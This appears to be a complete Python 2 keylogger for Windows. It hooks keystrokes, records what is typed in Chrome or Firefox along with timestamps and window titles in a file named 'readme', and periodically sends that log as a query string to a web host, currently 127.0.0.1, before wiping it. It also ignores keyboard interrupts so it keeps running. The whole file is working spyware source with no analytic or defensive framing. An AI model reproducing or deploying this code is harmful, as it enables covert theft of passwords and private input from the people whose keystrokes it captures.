import pythoncom, pyHook, requests
import win32process,psutil
import os, datetime, thread

def getLines():
    try:
        with open(os.path.join(SECRET_PATH,'readme')) as f:
                for i, l in enumerate(f):
                    pass
        return i + 1
    except:
        return 0

SECRET_PATH = ''
NORMALIZER = '                                                                      '
currString = ''
numLines = getLines()
print numLines
MAX_LINES = 5

def getProcessName(windowHandle):
    tid, pid = win32process.GetWindowThreadProcessId(windowHandle)
    p = psutil.Process(pid)
    return p.name()

def OnKeyboardEvent(event):

    global currString
    global numLines
    #to avoid random characters we dont wan't
    if(event.Key == "Back"):
        if(currString != ''):
            currString = currString[0:len(currString)-1]
        print 'CurrString:',currString
        return True

    if(event.Ascii < 32 and event.Ascii != 13):
        return True

    if(event.Ascii == 13):
        f = open(os.path.join(SECRET_PATH,'readme'),'a')
        f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')+" -- "+ currString + NORMALIZER[0:70-len(currString)]+" -- "+event.WindowName+ "\n")
        f.close()
        currString = ''
        numLines = numLines + 1

        return True

    #processName = getProcessName(event.Window)
    processName = "chrome.exe"
    if(processName == "chrome.exe" or processName == "firefox.exe"):
        currString = currString + chr(event.Ascii)
        print 'CurrString:',currString

    return True

def postToWeb():
    
    global numLines
    global MAX_LINES
    connection = False

    while True:

        if(numLines > MAX_LINES):

            try:
                connection = True
                requests.get("https://google.com", verify = False)
            except:
                connection = False

            if(connection):
                f = open(os.path.join(SECRET_PATH,'readme'))
                alldata = f.read()
                f.close()
                f = open(os.path.join(SECRET_PATH,'readme'),'w')
                f.close()

                page = requests.get("http://127.0.0.1?q="+alldata, verify = False)
                print "Sent data succesfully ~"

                numLines = 0
                MAX_LINES = 5

            else:
                print "Could not connect ~"
                MAX_LINES = MAX_LINES + 5

hookManager = pyHook.HookManager()
hookManager.KeyDown = OnKeyboardEvent
hookManager.HookKeyboard()

thread.start_new_thread(postToWeb,())
# to avoid keyboard interrupt
while True:
    try:
        while True:
            pythoncom.PumpWaitingMessages()
    except KeyboardInterrupt:
        pass